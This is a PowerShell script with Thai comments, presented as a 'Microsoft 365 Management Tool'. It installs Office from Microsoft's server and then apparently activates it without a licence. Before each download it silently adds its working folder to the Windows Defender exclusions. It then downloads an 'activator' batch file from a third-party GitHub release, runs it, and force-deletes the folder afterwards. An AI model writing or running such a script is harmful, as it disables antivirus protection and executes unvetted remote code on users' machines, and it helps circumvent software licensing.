# 1. ตรวจสอบเวอร์ชัน Microsoft 365 / Office
$officeReg = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Office\ClickToRun\Configuration" -ErrorAction SilentlyContinue
$currentVer = $officeReg.VersionToReport
$skipToActivate = $false

Write-Host "=== Microsoft 365 Management Tool ===" -ForegroundColor White -BackgroundColor Blue

if ($null -ne $currentVer) {
    Write-Host "`n[!] พบ Microsoft 365 ติดตั้งอยู่แล้ว (เวอร์ชัน: $currentVer)" -ForegroundColor Cyan
    Write-Host "1. อัปเกรดเป็นรุ่นล่าสุด (ดาวน์โหลดและติดตั้งใหม่)"
    Write-Host "2. ข้ามไปขั้นตอนการเปิดใช้งาน (Activate) เลย"
    $opt = Read-Host "กรุณาเลือก (1/2)"
    if ($opt -eq "2") { $skipToActivate = $true }
}

# ---------------------------------------------------------
# ส่วนการดาวน์โหลดและติดตั้ง (รันเมื่อเลือก 1 หรือยังไม่มี Office)
# ---------------------------------------------------------
if (-not $skipToActivate) {
    $p = "C:\phwyverysad"
    if (!(Test-Path $p)) { New-Item $p -Type Directory | Out-Null }
    
    # เพิ่ม Exclusion ทันที
    Write-Host "Adding $p to Windows Defender Exclusions..." -ForegroundColor Gray
    Add-MpPreference -ExclusionPath $p -EA 0
    
    # ตั้งค่า Network TLS 1.2 และปิด Progress Bar เพื่อความเร็วสูงสุด
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $oldP = $ProgressPreference
    $ProgressPreference = 'SilentlyContinue'

    # รายชื่อภาษาทั้งหมด (ไทย-อังกฤษ อยู่บนสุด)
    $langs = @(
        @{n="Thai [th-TH]"; c="th-th"},
        @{n="English [en-US]"; c="en-us"},
        @{n="Arabic [ar-SA]"; c="ar-sa"},
        @{n="Bulgarian [bg-BG]"; c="bg-bg"},
        @{n="Chinese (Simplified) [zh-CN]"; c="zh-cn"},
        @{n="Chinese (Taiwan) [zh-TW]"; c="zh-tw"},
        @{n="Croatian [hr-HR]"; c="hr-hr"},
        @{n="Czech [cs-CZ]"; c="cs-cz"},
        @{n="Danish [da-DK]"; c="da-dk"},
        @{n="Dutch [nl-NL]"; c="nl-nl"},
        @{n="Estonian [et-EE]"; c="et-ee"},
        @{n="Finnish [fi-FI]"; c="fi-fi"},
        @{n="French [fr-FR]"; c="fr-fr"},
        @{n="German [de-DE]"; c="de-de"},
        @{n="Greek [el-GR]"; c="el-gr"},
        @{n="Hebrew [he-IL]"; c="he-il"},
        @{n="Hindi [hi-IN]"; c="hi-in"},
        @{n="Hungarian [hu-HU]"; c="hu-hu"},
        @{n="Indonesian [id-ID]"; c="id-id"},
        @{n="Italian [it-IT]"; c="it-it"},
        @{n="Japanese [ja-JP]"; c="ja-jp"},
        @{n="Kazakh [kk-KZ]"; c="kk-kz"},
        @{n="Korean [ko-KR]"; c="ko-kr"},
        @{n="Latvian [lv-LV]"; c="lv-lv"},
        @{n="Lithuanian [lt-LT]"; c="lt-lt"},
        @{n="Malay [ms-MY]"; c="ms-my"},
        @{n="Norwegian [nb-NO]"; c="nb-no"},
        @{n="Polish [pl-PL]"; c="pl-pl"},
        @{n="Portuguese (Brazil) [pt-BR]"; c="pt-br"},
        @{n="Portuguese (Portugal) [pt-PT]"; c="pt-pt"},
        @{n="Romanian [ro-RO]"; c="ro-ro"},
        @{n="Russian [ru-RU]"; c="ru-ru"},
        @{n="Serbian (Latin) [sr-Latn-RS]"; c="sr-latn-rs"},
        @{n="Slovak [sk-SK]"; c="sk-sk"},
        @{n="Slovenian [sl-SI]"; c="sl-si"},
        @{n="Spanish [es-ES]"; c="es-es"},
        @{n="Swedish [sv-SE]"; c="sv-se"},
        @{n="Turkish [tr-TR]"; c="tr-tr"},
        @{n="Ukrainian [uk-UA]"; c="uk-ua"},
        @{n="Vietnamese [vi-VN]"; c="vi-vn"}
    )

    Write-Host "`n--- เลือกภาษาที่ต้องการติดตั้ง ---" -ForegroundColor Yellow
    for ($i=0; $i -lt $langs.Count; $i++) {
        Write-Host ("[{0:00}] {1}" -f $i, $langs[$i].n)
    }

    $sel = Read-Host "`nใส่หมายเลขภาษาที่ต้องการ"
    $lang = $langs[$sel]

    if ($null -ne $lang) {
        $url = "https://c2rsetup.officeapps.live.com/c2r/download.aspx?ProductreleaseID=O365ProPlusRetail&platform=x64&language=$($lang.c)&version=O16GA"
        $file = "$p\OfficeSetup.exe"

        Write-Host "`nDownloading Microsoft 365 ($($lang.n))..." -ForegroundColor Green
        try {
            # ดาวน์โหลดแบบ Synchronous ผ่าน .NET WebClient (เร็วที่สุด)
            (New-Object System.Net.WebClient).DownloadFile($url, $file)
            
            Write-Host "เริ่มการติดตั้งแบบเงียบ... (จะแสดงเปอร์เซ็นต์ในหน้าต่าง Setup)" -ForegroundColor Yellow
            # ติดตั้งแบบเงียบ (แสดงเฉพาะ UI ความคืบหน้า)
            Start-Process $file -ArgumentList "/configure" -Wait
        } catch {
            Write-Host "Error: $_" -ForegroundColor Red
            exit
        }
    } else {
        Write-Host "การเลือกไม่ถูกต้อง" -ForegroundColor Red
        exit
    }
    # คืนค่า UI
    $ProgressPreference = $oldP
}

# ---------------------------------------------------------
# 5. ส่วนการเปิดใช้งาน (Activation)
# ---------------------------------------------------------
$ans = Read-Host "`nติดตั้งเสร็จสมบูรณ์! จะเปิดการใช้งาน (Activate) Microsoft 365 เลยไหม? (y/n)"
if ($ans -eq 'y') {
    # ตัวแปรสำหรับคำสั่งรันที่คุณให้มา
    $p="C:\phwyverysad"; 
    $u="https://github.com/plathx/-/releases/download/%E0%B8%88%E0%B8%B9%E0%B8%99%E0%B8%84%E0%B8%AD%E0%B8%A1/activate_365.cmd"; 
    $f="$p\activate_365.cmd"; 
    
    [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; 
    $oldP=$ProgressPreference; 
    $ProgressPreference='SilentlyContinue'; 
    
    if(!(Test-Path $p)){New-Item $p -Type Directory | Out-Null}; 
    Add-MpPreference -ExclusionPath $p -EA 0; 
    
    try{
        Write-Host "Downloading Activator..." -ForegroundColor Green; 
        (New-Object System.Net.WebClient).DownloadFile($u,$f); 
        if(Test-Path $f){
            Write-Host "Running Activator Script..." -ForegroundColor Magenta; 
            Start-Process $f -Wait
        }
    }catch{
        Write-Host "Error: $_" -ForegroundColor Red
    }finally{
        Write-Host "Cleaning up $p..." -ForegroundColor Gray; 
        Start-Sleep -Seconds 3; 
        if(Test-Path $p){Remove-Item $p -Recurse -Force -EA 0}; 
        $ProgressPreference=$oldP; 
        Write-Host "Done." -ForegroundColor Green
    }
} else {
    Write-Host "กระบวนการเสร็จสิ้น (ไม่ได้ทำการเปิดใช้งาน)" -ForegroundColor Yellow
}
